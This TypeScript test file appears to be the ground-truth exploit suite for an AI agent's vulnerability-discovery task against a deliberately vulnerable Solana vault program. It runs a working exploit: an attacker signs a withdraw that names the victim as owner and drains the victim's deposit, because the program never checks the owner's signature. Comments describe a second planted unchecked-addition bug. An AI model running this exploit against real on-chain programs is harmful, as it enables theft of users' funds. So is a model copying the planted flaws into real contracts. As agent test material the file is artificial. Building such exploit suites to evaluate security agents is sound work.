import { describe, it, expect, beforeAll } from "vitest";

import * as anchor from "@coral-xyz/anchor";
import {
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccount,
  createMint,
  getAccount,
  mintTo,
} from "@solana/spl-token";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";

import { getProvider } from "./setup.js";

// ─── Local exploit suite ─────────────────────────────────────────────────
// Ground truth for the agent's discovery target.
//
// We test ONE planted bug at runtime — BUG #2 (missing signer check on
// withdraw) — because it has a clean public-surface exploit path.
//
// BUG #1 (unchecked add in deposit) is asserted by the agent's static
// pass only. SPL token's u64 supply invariants prevent us from
// legitimately accumulating > u64::MAX of a single mint in one account,
// so we can't drive a runtime overflow through the public deposit ix.
// The bug shape is still planted in the source (see the comment block
// in `instructions/deposit.rs`) — runtime-reachable the moment the
// program grows a yield-accrual or multi-mint path.

const VAULT_PROGRAM_ID = new PublicKey(
  "CbdZT6zkBvgfaWCPUooeTkCZDuRz8Rfwmnhw2Nu6ZooC",
);

const VAULT_SEED = Buffer.from("vault");
const VAULT_AUTHORITY_SEED = Buffer.from("vault-authority");
const POSITION_SEED = Buffer.from("position");

interface VaultCtx {
  provider: anchor.AnchorProvider;
  program: anchor.Program;
  mint: PublicKey;
  vault: PublicKey;
  vaultAuthority: PublicKey;
  vaultTokenAccount: PublicKey;
}

// solana-test-validator is racey at the "confirmed" level — `.rpc()` returns
// when the tx is in the bank but follow-up reads can still see pre-write
// state for a beat. We force a strict confirm before moving on, so each
// step in the exploit narrative is observed against the post-state of the
// previous step.
async function rpcAndConfirm(builder: { rpc(): Promise<string> }, conn: anchor.web3.Connection): Promise<string> {
  const sig = await builder.rpc();
  await conn.confirmTransaction(sig, "confirmed");
  return sig;
}

async function setupVault(): Promise<VaultCtx> {
  const provider = getProvider();
  const idl = require("../target/idl/vulnerable_vault.json");
  const program = new anchor.Program(idl, provider) as unknown as anchor.Program;

  const authority = (provider.wallet as anchor.Wallet).payer;

  const mint = await createMint(provider.connection, authority, authority.publicKey, null, 6);

  const [vault] = PublicKey.findProgramAddressSync(
    [VAULT_SEED, mint.toBuffer()],
    VAULT_PROGRAM_ID,
  );
  const [vaultAuthority] = PublicKey.findProgramAddressSync(
    [VAULT_AUTHORITY_SEED, vault.toBuffer()],
    VAULT_PROGRAM_ID,
  );

  const vaultTokenAccount = Keypair.generate();
  await rpcAndConfirm(
    program.methods
      .initializeVault()
      .accounts({
        authority: authority.publicKey,
        mint,
        vault,
        vaultAuthority,
        vaultTokenAccount: vaultTokenAccount.publicKey,
        systemProgram: SystemProgram.programId,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([vaultTokenAccount]),
    provider.connection,
  );

  return {
    provider,
    program,
    mint,
    vault,
    vaultAuthority,
    vaultTokenAccount: vaultTokenAccount.publicKey,
  };
}

async function makeFundedUser(
  ctx: VaultCtx,
  initialTokens: bigint,
): Promise<{ user: Keypair; tokenAccount: PublicKey }> {
  const user = Keypair.generate();
  const sig = await ctx.provider.connection.requestAirdrop(user.publicKey, LAMPORTS_PER_SOL);
  await ctx.provider.connection.confirmTransaction(sig, "confirmed");

  const authority = (ctx.provider.wallet as anchor.Wallet).payer;
  const tokenAccount = await createAssociatedTokenAccount(
    ctx.provider.connection,
    user,
    ctx.mint,
    user.publicKey,
  );
  if (initialTokens > 0n) {
    await mintTo(
      ctx.provider.connection,
      authority,
      ctx.mint,
      tokenAccount,
      authority,
      initialTokens,
    );
  }
  return { user, tokenAccount };
}

describe("vulnerable-vault exploit suite", () => {
  let ctx: VaultCtx;

  beforeAll(async () => {
    ctx = await setupVault();
  });

  it("BUG #2 — withdraw lands without the position owner's signature", async () => {
    const { user: victim, tokenAccount: victimTokens } = await makeFundedUser(ctx, 1_000_000n);
    const { user: attacker, tokenAccount: attackerTokens } = await makeFundedUser(ctx, 0n);

    const [position] = PublicKey.findProgramAddressSync(
      [POSITION_SEED, ctx.vault.toBuffer(), victim.publicKey.toBuffer()],
      VAULT_PROGRAM_ID,
    );

    await rpcAndConfirm(
      ctx.program.methods
        .openPosition()
        .accounts({
          owner: victim.publicKey,
          vault: ctx.vault,
          position,
          systemProgram: SystemProgram.programId,
        })
        .signers([victim]),
      ctx.provider.connection,
    );

    await rpcAndConfirm(
      ctx.program.methods
        .deposit(new anchor.BN(1_000_000))
        .accounts({
          owner: victim.publicKey,
          vault: ctx.vault,
          position,
          vaultTokenAccount: ctx.vaultTokenAccount,
          userTokenAccount: victimTokens,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([victim]),
      ctx.provider.connection,
    );

    // The exploit: build the withdraw ix with the victim's pubkey as
    // `owner`, but pay for + sign the tx with the attacker's keypair.
    // The program's withdraw ix has `owner: UncheckedAccount` (no signer
    // constraint, no `has_one = owner`), so the runtime never verifies
    // that the victim authorized this withdraw. Funds land in the
    // attacker's token account.
    //
    // We construct the tx manually instead of via MethodsBuilder.rpc()
    // because the latter wires the provider wallet as fee payer; the
    // agent's real attack flow uses its own throwaway payer, so we
    // mirror that here.
    const ix = await ctx.program.methods
      .withdraw(new anchor.BN(1_000_000))
      .accountsStrict({
        owner: victim.publicKey,
        vault: ctx.vault,
        position,
        vaultTokenAccount: ctx.vaultTokenAccount,
        vaultAuthority: ctx.vaultAuthority,
        recipientTokenAccount: attackerTokens,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .instruction();

    const tx = new Transaction().add(ix);
    tx.feePayer = attacker.publicKey;
    const { blockhash, lastValidBlockHeight } =
      await ctx.provider.connection.getLatestBlockhash("confirmed");
    tx.recentBlockhash = blockhash;
    tx.lastValidBlockHeight = lastValidBlockHeight;

    await sendAndConfirmTransaction(ctx.provider.connection, tx, [attacker], {
      commitment: "confirmed",
    });

    const after = await getAccount(ctx.provider.connection, attackerTokens);
    expect(after.amount).toBe(1_000_000n);
  });
});
